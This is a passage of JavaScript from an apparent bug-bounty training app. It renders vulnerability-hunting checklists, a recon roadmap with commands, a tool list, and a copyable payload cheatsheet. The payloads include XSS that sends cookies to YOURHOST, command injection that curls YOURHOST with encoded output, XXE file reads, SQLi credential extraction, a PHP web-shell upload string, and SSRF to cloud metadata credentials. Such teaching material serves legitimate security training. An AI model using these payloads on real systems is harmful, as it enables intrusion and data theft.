    row.innerHTML='<span class="ldot">'+(done.has(id)?'✓':'')+'</span><span class="lt-type">'+l.type+'</span><span class="path-t">'+esc(l.title)+'</span><span class="path-mod">'+l._mc.replace('MOD_','M')+'</span>';
    row.onclick=()=>openLesson(id);
    steps.appendChild(row);
  });
  host.appendChild(steps);
  const mlink=el("button","btn ghost",esc(t("spec.manual")));
  mlink.onclick=()=>showTool('manual');
  host.appendChild(mlink);
  card.querySelector(".spec-change").onclick=()=>{lsSetStr(SPEC_LS,"");renderHome();};
}

/* ============================================================
   FIELD MANUAL  (repeatable methodology checklists)
   ============================================================ */
let manualDone=lsGetSet("firstbounty.manual");
function manualSave(){lsSaveSet("firstbounty.manual",manualDone);}
const MANUALS=[
  {id:"idor",name:"IDOR / Access Control",sev:"High · top beginner ROI",phases:[
    {phase:"Recon",items:[
      "Create <strong>two accounts you control</strong> (A and B) — never use a stranger's data.",
      "Proxy the app through Burp and map every request carrying an ID: <code>?id=</code>, <code>/orders/5001</code>, <code>uuid</code>, filenames.",
      "Note which objects touch money, PII, or other users' content — prioritize those."]},
    {phase:"Test",items:[
      "As account A, replay a request but swap in account B's object ID.",
      "Try numeric neighbors, leaked UUIDs from other responses, and IDs in POST bodies the UI never exposes.",
      "Test every HTTP method and look for second-order IDOR (an ID stored now, used later).",
      "Check that <code>403</code> endpoints stay <code>403</code> under method/header tampering."]},
    {phase:"Confirm & report",items:[
      "Prove it with A reading B's data — screenshot both sessions.",
      "State horizontal vs vertical escalation and the exact data exposed.",
      "Recommend a server-side object-level authorization check."]}
  ]},
  {id:"massassign",name:"Mass Assignment",sev:"High",phases:[
    {phase:"Recon",items:[
      "Find endpoints that create/update objects (profile, settings, orders) and capture their JSON bodies.",
      "Compare the response object's fields to what the form submits — extra fields are candidates."]},
    {phase:"Test",items:[
      "Add privileged-looking keys to the body: <code>isAdmin</code>, <code>role</code>, <code>verified</code>, <code>balance</code>, <code>user_id</code>.",
      "Try fields seen in GET responses but not in the form (the model leaks its own schema).",
      "Check nested objects and arrays too."]},
    {phase:"Confirm & report",items:[
      "Show the privilege/state actually changed (re-fetch the object).",
      "Recommend an allow-list of bindable fields server-side."]}
  ]},
  {id:"xss",name:"XSS (reflected/stored/DOM)",sev:"Medium–High",phases:[
    {phase:"Recon",items:[
      "Spray a unique canary (e.g. <code>bb7h3re</code>) into every input, param, header and path; grep responses for where it reflects.",
      "For DOM XSS, read the JS for sinks: <code>innerHTML</code>, <code>document.write</code>, <code>eval</code>, jQuery <code>.html()</code>, and sources like <code>location.hash</code>."]},
    {phase:"Test",items:[
      "Identify the context (HTML / attribute / JS) and craft the matching break-out payload.",
      "Beat filters with event handlers (<code>onerror</code>, <code>onload</code>), case/entity tricks, and template literals.",
      "For stored XSS, find inputs rendered to other users (names, comments, support tickets)."]},
    {phase:"Confirm & report",items:[
      "Escalate past <code>alert(1)</code> — demonstrate cookie/session theft or an action as the victim.",
      "Note stored vs reflected and who is affected; include the exact payload and URL."]}
  ]},
  {id:"ssrf",name:"SSRF",sev:"High–Critical",phases:[
    {phase:"Recon",items:[
      "Find anything that fetches a URL: screenshotters, PDF/preview, webhooks, <code>?url=</code>, <code>?image=</code>, imports.",
      "Set up an out-of-band listener (Collaborator or your own) to catch blind SSRF."]},
    {phase:"Test",items:[
      "Point it at your listener first to confirm server-side fetch.",
      "Target internal ranges and <code>http://169.254.169.254/</code> (cloud metadata).",
      "Beat filters: <code>127.1</code>, <code>[::1]</code>, decimal IPs, your own 302-redirect, alternate schemes."]},
    {phase:"Confirm & report",items:[
      "Capture the internal response or the OOB callback from the target's IP.",
      "Spell out impact (internal access / credential theft) and recommend allow-listing + blocking link-local ranges."]}
  ]},
  {id:"csrf",name:"CSRF",sev:"Medium–High",phases:[
    {phase:"Recon",items:[
      "List state-changing requests (change email/password, transfer, delete).",
      "Check whether each carries an unpredictable anti-CSRF token and whether it's actually validated."]},
    {phase:"Test",items:[
      "Remove/alter the token and replay — does the action still succeed?",
      "Check if GET performs state changes, and whether SameSite cookies are absent.",
      "Build a minimal auto-submitting PoC form hosted off-origin."]},
    {phase:"Confirm & report",items:[
      "Demonstrate the state change from an external page using the victim's session.",
      "Recommend SameSite cookies + validated per-request CSRF tokens."]}
  ]},
  {id:"race",name:"Race Conditions",sev:"Medium–High",phases:[
    {phase:"Recon",items:[
      "Find single-use / limited actions: coupons, gift cards, withdrawals, votes, invites, 2FA attempts."]},
    {phase:"Test",items:[
      "Fire many identical requests in parallel (Burp turbo-intruder / single-packet attack).",
      "Compare the resulting state to the intended limit."]},
    {phase:"Confirm & report",items:[
      "Show the limit was exceeded (e.g. balance credited multiple times).",
      "Recommend atomic operations / locks on the check-then-act path."]}
  ]},
  {id:"takeover",name:"Subdomain Takeover",sev:"Medium–High",phases:[
    {phase:"Recon",items:[
      "Enumerate subdomains (<code>subfinder</code>), resolve CNAMEs, and probe with <code>httpx</code>.",
      "Flag CNAMEs pointing to third-party services (S3, Heroku, GitHub Pages, Azure, Shopify…)."]},
    {phase:"Test",items:[
      "Match the response to an unclaimed fingerprint (<code>NoSuchBucket</code>, <code>No such app</code>, <code>There isn't a GitHub Pages site here</code>).",
      "Confirm the backing service name is actually registrable."]},
    {phase:"Confirm & report",items:[
      "Claim it harmlessly (a benign PoC page / TXT record) to prove control — then report; don't serve malicious content.",
      "Recommend removing the dangling DNS record."]}
  ]},
  {id:"recon",name:"Recon & Info Disclosure",sev:"Low–High (scales with the leak)",phases:[
    {phase:"Map",items:[
      "<code>subfinder</code> → <code>httpx</code> for live hosts; hunt staging/dev/legacy/admin boxes.",
      "<code>gau</code>/<code>waybackurls</code> for historical URLs; <code>ffuf</code> for hidden paths.",
      "Pull and read every JS bundle; grep for endpoints, <code>token</code>, <code>secret</code>, <code>apiKey</code>."]},
    {phase:"Check",items:[
      "Probe for exposed <code>/.git</code>, <code>/.env</code>, <code>/backup.zip</code>, Swagger, and open dashboards (Grafana/Kibana/Jenkins).",
      "Run <code>nuclei</code> templates (respect rate limits & scope)."]},
    {phase:"Report",items:[
      "Rate by what actually leaked — a live key is High/Critical, a stack trace is Low.",
      "Never post real secrets publicly; redact in the report."]}
  ]}
];
function manualKey(m,pi,ii){return m.id+":"+pi+":"+ii;}
function renderFieldManual(){
  const v=$("#view");
  v.innerHTML='<div class="eyebrow">// Operator tools</div><h2 class="lesson-h">Field Manual</h2>'
    +'<div class="lesson-sub">Your repeatable methodology — run it on authorized, in-scope targets only</div>';
  const intro=el("div","note");
  intro.innerHTML='<span class="nt">How a specialist works</span><p>Pros don\'t improvise — they run a checklist on every target so nothing is missed. Pick your bug class, work the phases top-to-bottom, and tick each check. Your progress is saved per class; reset it when you start a fresh target.</p>';
  v.appendChild(intro);
  const tabs=el("div","man-tabs");
  const body=el("div","man-body");
  MANUALS.forEach((m,mi)=>{
    const tab=el("button","man-tab"+(mi===0?" active":""),esc(m.name));
    tab.onclick=()=>{document.querySelectorAll(".man-tab").forEach(t=>t.classList.remove("active"));tab.classList.add("active");drawManual(m,body);};
    tabs.appendChild(tab);
  });
  v.appendChild(tabs);v.appendChild(body);
  // default to the manual matching the chosen specialty if sensible
  const spec=lsGetStr(SPEC_LS);
  let start=0;
  if(spec==="access")start=0; else if(spec==="xss")start=2; else if(spec==="logic")start=4;
  const tabEls=tabs.querySelectorAll(".man-tab");
  tabEls.forEach(t=>t.classList.remove("active"));if(tabEls[start])tabEls[start].classList.add("active");
  drawManual(MANUALS[start],body);
  $("#main").scrollTop=0;
}
function drawManual(m,body){
  body.innerHTML="";
  let total=0,dc=0;
  m.phases.forEach((ph,pi)=>ph.items.forEach((it,ii)=>{total++;if(manualDone.has(manualKey(m,pi,ii)))dc++;}));
  const rp=total?Math.round(dc/total*100):0;
  const head=el("div","man-head");
  head.innerHTML='<div class="man-ready">'+ringSVG(rp,44)+'<div><div class="man-name">'+esc(m.name)+'</div><div class="man-sub">'+dc+'/'+total+' checks · '+esc(m.sev)+'</div></div></div>';
  const reset=el("button","btn ghost","Reset for new target");
  reset.onclick=()=>{m.phases.forEach((ph,pi)=>ph.items.forEach((it,ii)=>manualDone.delete(manualKey(m,pi,ii))));manualSave();drawManual(m,body);};
  head.appendChild(reset);body.appendChild(head);
  m.phases.forEach((ph,pi)=>{
    const sec=el("div","man-phase");
    sec.appendChild(el("div","man-phase-h",esc(ph.phase)));
    ph.items.forEach((it,ii)=>{
      const k=manualKey(m,pi,ii),on=manualDone.has(k);
      const row=el("div","man-item"+(on?" on":""));
      row.innerHTML='<span class="man-check">'+(on?'✓':'')+'</span><span>'+it+'</span>';
      row.onclick=()=>{if(manualDone.has(k))manualDone.delete(k);else manualDone.add(k);manualSave();drawManual(m,body);};
      sec.appendChild(row);
    });
    body.appendChild(sec);
  });
}

/* ============================================================
   ARSENAL  (hunt roadmap + toolbox + payloads, copyable)
   ============================================================ */
const HUNT_PHASES=[
  {n:0,name:"Scope & Setup",goal:"Read the rules, wire up your kit, stay legal. The boring phase that keeps you out of court.",
   tools:["Burp Suite","Firefox + FoxyProxy","the program scope page","a notes system"],
   cmds:[
     {l:"Pin the target to a variable",c:"export TARGET=example.com"},
     {l:"Make a workspace",c:"mkdir -p $TARGET/{recon,content,findings} && cd $TARGET"},
     {l:"Tag your traffic (Burp → Match & Replace, add header)",c:"X-Bug-Bounty: yourhandle"}
   ],
   looking:"In-scope domains, safe-harbor clause, and what's forbidden (automation limits, DoS, social engineering, out-of-scope subsidiaries)."},
  {n:1,name:"Recon — Asset Discovery",goal:"Find everything the target owns. The wider the surface you map, the less competition on what you test.",
   tools:["subfinder","amass","assetfinder","crt.sh","chaos","dnsx"],
   cmds:[
     {l:"Passive subdomains",c:"subfinder -d $TARGET -all -silent | tee recon/subs.txt"},
     {l:"Certificate Transparency logs",c:"curl -s \"https://crt.sh/?q=%25.$TARGET&output=json\" | jq -r '.[].name_value' | sort -u"},
     {l:"Amass (passive)",c:"amass enum -passive -d $TARGET -o recon/amass.txt"},
     {l:"Merge & dedupe everything",c:"cat recon/subs.txt recon/amass.txt | sort -u > recon/all-subs.txt"},
     {l:"Resolve to IPs",c:"dnsx -l recon/all-subs.txt -resp -o recon/resolved.txt"}
   ],
   looking:"Subdomains (staging/dev/admin/vpn/legacy), ASNs and IP ranges, acquisitions, forgotten hosts nobody else tested."},
  {n:2,name:"Enumeration & Probing",goal:"Of everything you found, what's actually alive and what's running on it?",
   tools:["httpx","naabu","nmap","dnsx"],
   cmds:[
     {l:"Probe live web hosts + tech",c:"httpx -l recon/all-subs.txt -title -tech-detect -sc -o recon/live.txt"},
     {l:"Fast port sweep",c:"naabu -l recon/resolved.txt -top-ports 1000 -o recon/ports.txt"},
     {l:"Deep scan an interesting host",c:"nmap -sV -p- -T4 <TARGET_IP>"}
   ],
   looking:"Live apps, non-standard open ports (8080/8443/3306/6379…), technologies & versions, odd redirects."},
  {n:3,name:"Content & Parameter Discovery",goal:"Uncover the hidden endpoints, files, parameters and secrets the UI never links to.",
   tools:["ffuf","feroxbuster","gau","waybackurls","katana","gf","arjun","qsreplace"],
   cmds:[
     {l:"Directory / file fuzzing",c:"ffuf -u https://$TARGET/FUZZ -w ~/wordlists/raft-medium-directories.txt -mc all -fc 404"},
     {l:"Historical URLs",c:"gau $TARGET | sort -u | tee content/urls.txt"},
     {l:"Crawl (JS-aware)",c:"katana -u https://$TARGET -d 5 -jc -o content/crawl.txt"},
     {l:"Hunt XSS-prone params + inject marker",c:"gau $TARGET | gf xss | qsreplace '\"><svg onload=alert(1)>' | tee content/xss-candidates.txt"},
     {l:"Find hidden parameters",c:"arjun -u https://$TARGET/api/item"},
     {l:"Read JS for endpoints & secrets",c:"cat content/urls.txt | grep '\\.js$' | httpx -silent | xargs -I{} curl -s {} | grep -Eo '(/[a-zA-Z0-9_./-]+|apiKey|token|secret|v[0-9]/)' | sort -u"}
   ],
   looking:"/admin, /.git, /backup.zip, API routes, hidden params, Swagger docs, secrets left in JS bundles."},
  {n:4,name:"Vulnerability Hunting",goal:"Work the mapped surface one bug class at a time. This is where the Field Manual earns its keep.",
   tools:["Burp Repeater/Intruder","nuclei","dalfox","sqlmap (careful)","manual testing"],
   cmds:[
     {l:"Template scan (respect scope & rate limits)",c:"nuclei -l recon/live.txt -severity low,medium,high,critical -rl 50"},
     {l:"Validate XSS candidates",c:"cat content/xss-candidates.txt | dalfox pipe"},
     {l:"Manual is king — replay & tamper in Burp Repeater",c:"# IDOR, access control & logic are found by hand, not scanners"}
   ],
   looking:"IDOR / broken access control, XSS, SQLi, SSRF, business logic, misconfig. Pick your specialty and go deep.",
   link:{label:"Open the Field Manual →",view:"manual"}},
  {n:5,name:"Exploitation & PoC",goal:"Confirm the bug and prove minimum impact — ethically, with accounts you own. Then STOP.",
   tools:["Burp","interactsh-client","jwt_tool","two test accounts"],
   cmds:[
     {l:"OOB listener for blind SSRF/XXE",c:"interactsh-client   # put the printed domain in your payload, watch for the callback"},
     {l:"Test / forge a JWT",c:"python3 jwt_tool.py <JWT> -T"},
     {l:"Prove IDOR with two accounts you control",c:"# as account A, request account B's object — screenshot both"}
   ],
   looking:"A clean, minimal, repeatable proof. Don't exfiltrate real users' data, don't pivot deeper. Screenshot everything."},
  {n:6,name:"Reporting",goal:"A clear report gets triaged fast and paid fairly. A confusing one on a great bug earns nothing.",
   tools:["Report Builder (this app)","a CVSS calculator"],
   cmds:[
     {l:"Title format that triagers love",c:"[Bug type] on [endpoint] leading to [impact]"},
     {l:"Impact one-liner",c:"An [attacker type] can [action] affecting [who/what], because [root cause]."}
   ],
   looking:"Clear repro steps, business-impact framing, a working PoC, honest severity, and a remediation line.",
   link:{label:"Open the Report Builder →",view:"report"}}
];
const TOOLBOX=[
  {cat:"Recon & subdomains",tools:[
    {name:"subfinder",purpose:"Fast passive subdomain enumeration from dozens of sources.",install:"go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",cmd:"subfinder -d target.com -all -silent -o subs.txt",url:"https://github.com/projectdiscovery/subfinder"},
    {name:"amass",purpose:"In-depth subdomain enumeration & network mapping (OWASP).",install:"go install -v github.com/owasp-amass/amass/v4/...@master",cmd:"amass enum -passive -d target.com -o amass.txt",url:"https://github.com/owasp-amass/amass"},
    {name:"assetfinder",purpose:"Quick subdomains from many public sources.",install:"go install github.com/tomnomnom/assetfinder@latest",cmd:"assetfinder --subs-only target.com",url:"https://github.com/tomnomnom/assetfinder"},
    {name:"chaos",purpose:"ProjectDiscovery's public recon dataset of subdomains.",install:"go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest",cmd:"chaos -d target.com -silent",url:"https://github.com/projectdiscovery/chaos-client"},
    {name:"crt.sh",purpose:"Subdomains from Certificate Transparency logs — no install, just the web/API.",install:"# web: https://crt.sh",cmd:"curl -s \"https://crt.sh/?q=%25.target.com&output=json\" | jq -r '.[].name_value' | sort -u",url:"https://crt.sh"}
  ]},
  {cat:"Resolving & probing",tools:[
    {name:"dnsx",purpose:"Fast, multi-purpose DNS resolver & toolkit.",install:"go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest",cmd:"dnsx -l subs.txt -resp -o resolved.txt",url:"https://github.com/projectdiscovery/dnsx"},
    {name:"httpx",purpose:"Probe hosts for status, title, tech, redirects — turn a subdomain list into live targets.",install:"go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest",cmd:"httpx -l subs.txt -title -tech-detect -sc -o live.txt",url:"https://github.com/projectdiscovery/httpx"},
    {name:"naabu",purpose:"Fast SYN/CONNECT port scanner.",install:"go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",cmd:"naabu -l resolved.txt -top-ports 1000 -o ports.txt",url:"https://github.com/projectdiscovery/naabu"},
    {name:"nmap",purpose:"The classic deep port/service/version scanner.",install:"sudo apt install nmap   # or: brew install nmap",cmd:"nmap -sV -p- -T4 <TARGET_IP>",url:"https://nmap.org"}
  ]},
  {cat:"Crawling, content & params",tools:[
    {name:"katana",purpose:"Fast, JS-aware crawler for endpoints.",install:"go install -v github.com/projectdiscovery/katana/cmd/katana@latest",cmd:"katana -u https://target.com -d 5 -jc -o crawl.txt",url:"https://github.com/projectdiscovery/katana"},
    {name:"gau",purpose:"Fetch known URLs from Wayback, CommonCrawl, OTX.",install:"go install github.com/lc/gau/v2/cmd/gau@latest",cmd:"gau target.com | sort -u > urls.txt",url:"https://github.com/lc/gau"},
    {name:"waybackurls",purpose:"Pull every URL the Wayback Machine has seen.",install:"go install github.com/tomnomnom/waybackurls@latest",cmd:"waybackurls target.com | sort -u",url:"https://github.com/tomnomnom/waybackurls"},
    {name:"hakrawler",purpose:"Quick web crawler for endpoints & assets.",install:"go install github.com/hakluke/hakrawler@latest",cmd:"echo https://target.com | hakrawler",url:"https://github.com/hakluke/hakrawler"},
    {name:"ffuf",purpose:"Fast web fuzzer — directories, files, vhosts, parameters.",install:"go install github.com/ffuf/ffuf/v2@latest",cmd:"ffuf -u https://target.com/FUZZ -w list.txt -mc all -fc 404",url:"https://github.com/ffuf/ffuf"},
    {name:"feroxbuster",purpose:"Recursive content discovery (Rust, fast).",install:"cargo install feroxbuster   # or: brew install feroxbuster",cmd:"feroxbuster -u https://target.com -w list.txt",url:"https://github.com/epi052/feroxbuster"},
    {name:"gobuster",purpose:"Dir / DNS / vhost brute-forcing.",install:"go install github.com/OJ/gobuster/v3@latest",cmd:"gobuster dir -u https://target.com -w list.txt",url:"https://github.com/OJ/gobuster"},
    {name:"arjun",purpose:"Discover hidden HTTP parameters.",install:"pipx install arjun",cmd:"arjun -u https://target.com/api/item",url:"https://github.com/s0md3v/Arjun"},
    {name:"gf",purpose:"Tomnomnom's grep wrapper — pattern-match vuln-prone URLs.",install:"go install github.com/tomnomnom/gf@latest   # + gf-patterns",cmd:"gau target.com | gf xss | sort -u",url:"https://github.com/tomnomnom/gf"},
    {name:"qsreplace",purpose:"Swap query-string values — great for spraying payloads.",install:"go install github.com/tomnomnom/qsreplace@latest",cmd:"cat xss.txt | qsreplace '\"><svg onload=alert(1)>'",url:"https://github.com/tomnomnom/qsreplace"},
    {name:"unfurl",purpose:"Extract hosts/paths/params/keys out of a list of URLs.",install:"go install github.com/tomnomnom/unfurl@latest",cmd:"cat urls.txt | unfurl keys | sort -u",url:"https://github.com/tomnomnom/unfurl"}
  ]},
  {cat:"Scanning",tools:[
    {name:"nuclei",purpose:"Template-based vulnerability scanner with a huge community template set.",install:"go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",cmd:"nuclei -l live.txt -severity medium,high,critical -rl 50",url:"https://github.com/projectdiscovery/nuclei"},
    {name:"nikto",purpose:"Classic web-server misconfiguration scanner.",install:"sudo apt install nikto",cmd:"nikto -h https://target.com",url:"https://github.com/sullo/nikto"}
  ]},
  {cat:"Manual testing & proxies",tools:[
    {name:"Burp Suite",purpose:"The intercepting proxy — your primary manual weapon (Repeater, Intruder, Match&Replace).",install:"# Download Community (free): portswigger.net/burp/communitydownload",cmd:"Proxy → Intercept  ·  send to Repeater (Ctrl+R)",url:"https://portswigger.net/burp"},
    {name:"Caido",purpose:"Modern, lightweight Burp alternative (Rust).",install:"# Download: caido.io",cmd:"(GUI) — proxy, replay, automate",url:"https://caido.io"},
    {name:"mitmproxy",purpose:"Scriptable CLI/TUI/web intercepting proxy.",install:"pipx install mitmproxy",cmd:"mitmweb   # or: mitmproxy",url:"https://mitmproxy.org"}
  ]},
  {cat:"Exploitation helpers",tools:[
    {name:"dalfox",purpose:"Automated XSS discovery & verification.",install:"go install github.com/hahwul/dalfox/v2@latest",cmd:"cat xss-candidates.txt | dalfox pipe",url:"https://github.com/hahwul/dalfox"},
    {name:"sqlmap",purpose:"Automated SQL injection — powerful, but automation is often out of scope: check rules.",install:"pipx install sqlmap",cmd:"sqlmap -u 'https://target.com/item?id=1' --batch --level 1 --risk 1",url:"https://github.com/sqlmapproject/sqlmap"},
    {name:"jwt_tool",purpose:"Analyze, tamper and forge JSON Web Tokens.",install:"git clone https://github.com/ticarpi/jwt_tool",cmd:"python3 jwt_tool.py <JWT> -T",url:"https://github.com/ticarpi/jwt_tool"},
    {name:"interactsh-client",purpose:"Out-of-band interaction server for blind SSRF / XXE / RCE proof.",install:"go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",cmd:"interactsh-client   # use the printed domain in your payload",url:"https://github.com/projectdiscovery/interactsh"}
  ]},
  {cat:"Wordlists & references",tools:[
    {name:"SecLists",purpose:"The wordlist collection — dirs, params, payloads, usernames, everything.",install:"git clone https://github.com/danielmiessler/SecLists",cmd:"ls SecLists/Discovery/Web-Content/",url:"https://github.com/danielmiessler/SecLists"},
    {name:"PayloadsAllTheThings",purpose:"Payload & technique reference for every bug class.",install:"git clone https://github.com/swisskyrepo/PayloadsAllTheThings",cmd:"# browse the per-vuln folders",url:"https://github.com/swisskyrepo/PayloadsAllTheThings"}
  ]}
];
const ARSENAL=[
  {cat:"Recon — map the attack surface",items:[
    {label:"Subdomains → live hosts",note:"The daily first move on a wide-scope target.",code:"subfinder -d example.com -silent | httpx -silent -title -tech-detect"},
    {label:"Historical URLs",note:"Old endpoints & params that still work.",code:"gau example.com | tee urls.txt ; cat urls.txt | grep '=' | qsreplace"},
    {label:"Content discovery",note:"Find unlinked paths.",code:"ffuf -u https://example.com/FUZZ -w raft-medium-directories.txt -mc 200,204,301,302,401,403"},
    {label:"Template scan (respect scope/rate)",code:"nuclei -l live.txt -severity low,medium,high,critical -rl 50"},
    {label:"Grep JS for secrets & endpoints",code:"cat *.js | grep -Eo '(/[a-zA-Z0-9_./-]+|apiKey|token|secret|v[0-9]/)' | sort -u"}
  ]},
  {cat:"IDOR / access control",items:[
    {label:"Autorize mindset",note:"Repeat A's request with B's IDs. Two accounts you own.",code:"GET /api/invoice?id=1023   (yours is 1024)"},
    {label:"Common ID spots to swap",code:"?id=  ?user=  /orders/{n}  X-User-Id: header  {\"account_id\":N} in body"},
    {label:"403 → 200 tricks",code:"X-Original-URL: /admin   |   method POST↔GET   |   /admin/..;/   |   trailing %20"}
  ]},
  {cat:"XSS payloads",items:[
    {label:"HTML context (filter-light)",code:"<img src=x onerror=alert(document.domain)>"},
    {label:"Attribute break-out",code:"\"><svg onload=alert(document.domain)>"},
    {label:"No parentheses",code:"<svg onload=alert`1`>"},
    {label:"Cookie exfil PoC (your listener)",code:"<img src=x onerror=\"new Image().src='https://YOURHOST/c?'+document.cookie\">"},
    {label:"Polyglot (tries several contexts)",code:"jaVasСript:/*-/*`/*\\`/*'/*\"/**/(/* */oNclick=alert() )//"}
  ]},
  {cat:"SQL injection",items:[
    {label:"Auth bypass (username)",code:"admin'-- -"},
    {label:"Tautology",code:"' OR '1'='1"},
    {label:"Find column count",code:"' ORDER BY 5-- -"},
    {label:"UNION extract",code:"' UNION SELECT username,password FROM users-- -"},
    {label:"Time-based blind probe",code:"'; IF (1=1) WAITFOR DELAY '0:0:5'-- -"}
  ]},
  {cat:"SSRF filter bypass",items:[
    {label:"Loopback variants",code:"127.0.0.1  127.1  0.0.0.0  [::1]  2130706433  127.0.0.1.nip.io"},
    {label:"Cloud metadata (AWS)",code:"http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
    {label:"Redirect to internal",code:"https://YOURHOST/redirect?to=http://169.254.169.254/"}
  ]},
  {cat:"Auth / JWT / CORS",items:[
    {label:"JWT alg:none forge",note:"header.payload. with empty signature.",code:"{\"alg\":\"none\",\"typ\":\"JWT\"}  +  {\"role\":\"admin\"}"},
    {label:"CORS reflection test",code:"curl -s -I https://api.example.com/me -H 'Origin: https://evil.com' | grep -i access-control"},
    {label:"Open redirect test params",code:"?next=  ?url=  ?redirect=  ?returnTo=  ?dest=   →  //evil.com  /\\evil.com"}
  ]},
  {cat:"Open redirect",items:[
    {label:"Common vulnerable params",code:"?next=  ?url=  ?redirect=  ?returnTo=  ?dest=  ?continue="},
    {label:"Bypass naive filters",code:"//evil.com   https:evil.com   /\\evil.com   https://target.com@evil.com"}
  ]},
  {cat:"Path traversal / LFI",items:[
    {label:"Classic",code:"../../../../etc/passwd"},
    {label:"Encoded / filter bypass",code:"..%2f..%2f..%2fetc%2fpasswd   ....//....//etc/passwd   %2e%2e%2f"},
    {label:"Windows",code:"..\\..\\..\\windows\\win.ini"}
  ]},
  {cat:"Command injection",items:[
    {label:"Separators to try",code:"; ls    | id    & whoami    `id`    $(id)    %0a id"},
    {label:"Blind — ping your listener",code:"; nslookup $(whoami).YOURHOST   | curl https://YOURHOST/$(id|base64)"}
  ]},
  {cat:"File upload",items:[
    {label:"Try these tricks",code:"shell.php.jpg   shell.pHp   shell.php%00.jpg   Content-Type: image/png on a .php"},
    {label:"Polyglot / magic bytes",code:"GIF89a; <?php system($_GET['c']); ?>"}
  ]},
  {cat:"XXE (XML)",items:[
    {label:"File read",code:"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"},
    {label:"OOB / blind (SSRF to your server)",code:"<!ENTITY % p SYSTEM \"http://YOURHOST/x.dtd\"> %p;"}
  ]},
  {cat:"Report snippets",items:[
    {label:"Title format",code:"[Bug type] on [endpoint] leading to [impact]"},
    {label:"Impact one-liner",code:"An unauthenticated/any attacker can [action] affecting [who/what], because [root cause]."},
    {label:"Ethics footer (reassures triage)",code:"Tested only within scope; no real user data accessed; PoC used accounts I control."}
  ]}
];
function renderArsenal(){
  const v=$("#view");
  v.innerHTML='<div class="eyebrow">// Operator tools</div><h2 class="lesson-h">The Arsenal</h2>'
    +'<div class="lesson-sub">The hunter’s cheatsheet — a phase-by-phase roadmap, every tool, and the payloads</div>';
  const warn=el("div","note warn");
  warn.innerHTML='<span class="nt">Use responsibly</span><p>Everything here fires only at <strong>in-scope, authorized</strong> programs and your own labs. Swap the markers (<code>target.com</code>, <code>YOURHOST</code>) and stay surgical. Automated scanning on random sites is illegal and gets you banned.</p>';
  v.appendChild(warn);
  const tabs=el("div","man-tabs");
  const search=el("input","ars-search");search.type="text";search.placeholder="Filter everything in this tab…";
  const list=el("div","ars-list");
  let active="roadmap";
  [["roadmap","Hunt Roadmap"],["toolbox","Toolbox"],["payloads","Payloads"]].forEach(([id,label],i)=>{
    const t=el("button","man-tab"+(i===0?" active":""),esc(label));t.dataset.tab=id;
    t.onclick=()=>{active=id;tabs.querySelectorAll(".man-tab").forEach(x=>x.classList.remove("active"));t.classList.add("active");search.value="";draw("");};
    tabs.appendChild(t);
  });
  v.appendChild(tabs);v.appendChild(search);v.appendChild(list);
  function cmdRow(label,code){
    const row=el("div","ars-row");
    row.innerHTML='<div class="ars-label">'+esc(label)+'</div><pre class="ars-code"><code>'+esc(code)+'</code></pre>';
    row.appendChild(copyBtn(code));return row;
  }
  function drawRoadmap(q){
    HUNT_PHASES.forEach(ph=>{
      const hay=(ph.name+" "+ph.goal+" "+ph.tools.join(" ")+" "+ph.cmds.map(x=>x.l+" "+x.c).join(" ")+" "+ph.looking).toLowerCase();
      if(q&&!hay.includes(q))return;
      const card=el("div","phase");
      card.innerHTML='<div class="phase-h"><span class="phase-badge">PHASE '+ph.n+'</span><span class="phase-name">'+esc(ph.name)+'</span></div>'
        +'<div class="phase-goal">'+esc(ph.goal)+'</div>'
        +'<div class="phase-tools">'+ph.tools.map(t=>'<span class="spec-chip">'+esc(t)+'</span>').join('')+'</div>';
      const cmds=el("div","phase-cmds");ph.cmds.forEach(cm=>cmds.appendChild(cmdRow(cm.l,cm.c)));card.appendChild(cmds);
      const look=el("div","phase-look");look.innerHTML='<strong>Looking for:</strong> '+esc(ph.looking);card.appendChild(look);
      if(ph.link){const b=el("button","btn ghost",esc(ph.link.label));b.style.marginTop="12px";b.onclick=()=>showTool(ph.link.view);card.appendChild(b);}
      list.appendChild(card);
    });
  }
  function drawToolbox(q){
    TOOLBOX.forEach(cat=>{
      const tools=cat.tools.filter(t=>!q||(cat.cat+" "+t.name+" "+t.purpose+" "+t.cmd+" "+t.install).toLowerCase().includes(q));
      if(!tools.length)return;
      const sec=el("div","ars-cat");sec.appendChild(el("div","ars-cat-h",esc(cat.cat)));
      tools.forEach(t=>{
        const card=el("div","tool-card");
        card.innerHTML='<div class="tool-top"><span class="tool-name">'+esc(t.name)+'</span>'+(t.url?'<a class="tool-link" href="'+esc(t.url)+'" target="_blank" rel="noopener">docs ↗</a>':'')+'</div>'
          +'<div class="tool-purpose">'+esc(t.purpose)+'</div>';
        const inRow=el("div","tool-cmd");inRow.innerHTML='<span class="tool-tag">install</span><pre class="ars-code"><code>'+esc(t.install)+'</code></pre>';inRow.appendChild(copyBtn(t.install));
        const cmRow=el("div","tool-cmd");cmRow.innerHTML='<span class="tool-tag use">use</span><pre class="ars-code"><code>'+esc(t.cmd)+'</code></pre>';cmRow.appendChild(copyBtn(t.cmd));
        card.appendChild(inRow);card.appendChild(cmRow);sec.appendChild(card);
      });
      list.appendChild(sec);
    });
  }
  function drawPayloads(q){
    ARSENAL.forEach(cat=>{
      const items=cat.items.filter(it=>!q||(cat.cat+" "+it.label+" "+(it.note||"")+" "+it.code).toLowerCase().includes(q));
      if(!items.length)return;
      const sec=el("div","ars-cat");sec.appendChild(el("div","ars-cat-h",esc(cat.cat)));
      items.forEach(it=>{
        const row=el("div","ars-row");
        row.innerHTML='<div class="ars-label">'+esc(it.label)+'</div>'+(it.note?'<div class="ars-note">'+esc(it.note)+'</div>':'')+'<pre class="ars-code"><code>'+esc(it.code)+'</code></pre>';
        row.appendChild(copyBtn(it.code));sec.appendChild(row);
      });
      list.appendChild(sec);
    });
  }
  function draw(q){
    list.innerHTML="";q=(q||"").toLowerCase().trim();
    if(active==="roadmap")drawRoadmap(q);
    else if(active==="toolbox")drawToolbox(q);
    else drawPayloads(q);
